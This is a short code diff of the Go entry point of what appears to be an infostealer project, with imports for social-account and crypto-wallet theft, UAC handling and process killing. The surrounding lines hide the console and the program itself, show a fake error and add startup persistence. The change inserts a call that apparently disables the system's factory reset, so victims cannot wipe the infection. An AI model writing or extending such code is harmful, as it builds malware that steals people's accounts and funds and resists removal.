@@ -10,7 +10,8 @@ import (
 	"github.com/unf6/vryxen/internal/uac"
 	"github.com/unf6/vryxen/pkg/utils/common"
 	"github.com/unf6/vryxen/pkg/utils/processkill"
-
+        "github.com/unf6/vryxen/internal/fr"
+	
 
 	"github.com/unf6/vryxen/internal/core/socials"
 	"github.com/unf6/vryxen/internal/core/cryptowallets"
@@ -50,7 +51,8 @@ func main() {
 
 	HideConsole.Hide()
 	common.HideSelf()
-
+	FactoryReset.Disable()
+	
 	if !common.IsInStartupPath() {
 		go FakeError.Show()
 		go startup.Run()
